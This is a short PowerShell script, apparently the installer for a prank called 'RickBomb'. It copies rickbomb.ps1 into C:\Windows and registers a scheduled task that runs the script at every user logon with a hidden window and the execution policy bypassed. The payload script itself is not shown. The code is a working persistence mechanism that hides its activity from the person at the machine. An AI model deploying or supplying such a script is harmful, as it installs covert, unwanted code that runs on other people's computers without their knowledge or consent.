Copy-Item "$PSScriptRoot\rickbomb.ps1" "C:\Windows"
$command = "cmd"
$argument = '/c start /min powershell -file "c:\windows\rickbomb.ps1" -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -windowstyle Hidden'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$action = New-ScheduledTaskAction -Execute $command -Argument $argument
$principal = New-ScheduledTaskPrincipal -GroupId "S-1-5-32-545"
Register-ScheduledTask -TaskName "RickBomb" -Trigger $trigger -Action $action -Principal $principal
